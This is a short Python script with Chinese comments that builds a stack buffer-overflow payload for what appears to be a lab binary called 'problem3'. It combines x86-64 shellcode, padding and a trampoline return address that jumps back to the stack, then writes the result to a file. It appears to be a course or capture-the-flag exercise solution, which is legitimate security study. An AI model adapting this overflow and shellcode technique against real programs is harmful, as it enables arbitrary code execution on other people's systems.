import sys
import struct

# 准备 Shellcode
shellcode = b'\x6a\x72\x5f\x48\xc7\xc0\x16\x12\x40\x00\xff\xd0'

# 计算填充
padding_len = (32 - len(shellcode)) + 8
padding = b'A' * padding_len

# 目标地址 (Trampoline)
# 不跳 func1，而是跳 jmp_xs，让它帮我们要跳回栈上的 Shellcode
jmp_xs_addr = 0x401334
ret_addr = struct.pack('<Q', jmp_xs_addr)

# 组合
payload = shellcode + padding + ret_addr

# 写入
print(f"Shellcode len: {len(shellcode)}")
print(f"Padding len: {padding_len}")
with open("ans3.txt", "wb") as f:
    f.write(payload)

print("Done! Run: ./problem3 ans3.txt")